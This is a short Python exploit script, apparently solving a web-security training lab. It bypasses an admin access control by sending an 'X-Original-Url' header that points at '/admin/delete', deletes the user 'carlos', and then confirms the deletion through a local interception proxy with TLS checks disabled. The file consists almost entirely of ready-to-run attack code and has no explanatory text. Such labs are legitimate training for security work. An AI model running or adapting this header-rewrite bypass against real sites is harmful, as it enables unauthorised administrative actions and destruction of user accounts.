import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(session, url):
    delete_carlos_user_url = url + "?username=carlos"
    headers = {'X-Original-Url': '/admin/delete'}

    res = session.get(delete_carlos_user_url, headers=headers, verify=False, proxies=proxies)

    # Verify if the user was deleted
    res = session.get(url, headers={'X-Original-Url': '/admin'}, verify=False, proxies=proxies)

    if "carlos" not in res.text:
        print("(+) Carlos user deleted successfully..")
    else:
        print("(-) Unable to delete user 'carlos'!")

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python {sys.argv[0]} <url>")
        print(f"(+) Example: python {sys.argv[0]} https://www.example.com")
        sys.exit(-1)

    session = requests.session()
    url = sys.argv[1].strip()
    print("(+) Deleting carlos user..")
    delete_user(session, url)

if __name__ == "__main__":
    main()

